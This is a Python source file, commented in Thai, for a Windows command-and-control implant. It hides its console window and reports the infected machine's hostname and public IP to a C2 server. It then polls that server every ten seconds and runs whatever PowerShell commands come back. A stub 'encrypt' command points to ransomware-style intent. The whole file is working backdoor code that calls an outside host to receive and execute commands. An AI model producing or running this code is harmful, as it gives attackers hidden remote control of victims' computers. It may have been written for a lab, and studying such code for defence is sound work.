import os
import subprocess
import time
import requests
import ctypes

C2_URL = "http://192.168.10.151:8080"  # IP C2 Server *** อย่าลืมเปลี่ยน ***
hostname = os.getenv("COMPUTERNAME")

def hide_console():
    """ซ่อนหน้าต่าง Console"""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def report_to_c2():
    """แจ้ง C2 Server ว่าเครื่องนี้ติดเชื้อแล้ว"""
    ip = requests.get("https://api.ipify.org").text  # ดึง IP สาธารณะ
    data = {"hostname": hostname, "ip": ip } # เตรีมข้อมูลรูบแบบ jason
    requests.post(f"{C2_URL}/report", json=data) # ส่งข้อมูล

def get_command():
    """ดึงคำสั่งจาก C2 Server"""
    response = requests.get(f"{C2_URL}/{hostname}/command")
    if response.status_code == 200:
        return response.json().get("cmd")
    return None

def execute_command(cmd):
    """ดำเนินการตามคำสั่งที่ได้รับจาก C2"""
    if cmd == "encrypt":
        ctypes.windll.user32.MessageBoxW(0, "succuess", "succuess", 0x40)  # แสดงแจ้งเตือ
        exit()
    elif cmd == "exit":
        exit()

def get_shell():
    response = requests.get(f"{C2_URL}/{hostname}/shell")
    if response.status_code == 200:
        return response.json().get("pws")
    return None

def execute_shell(pws):
    if pws == "pass" : return None
    try:
        subprocess.run(["powershell", "-Command", pws], check=True)
        data = {"hostname": hostname, "pws": None}
        requests.post(f"{C2_URL}/set_shell", json=data)
    except subprocess.CalledProcessError as e:
        pass
    return None

def main():
    hide_console()  # ซ่อนหน้าต่าง Console
    report_to_c2()  # แจ้ง C2 Server

    while True:
        cmd = get_command()  # ดึงคำสั่งจาก C2
        if cmd:
            execute_command(cmd)
        pws = get_shell()
        if pws:
            execute_shell(pws)
        time.sleep(10)  # defualt = 10

if __name__ == "__main__":
    main()
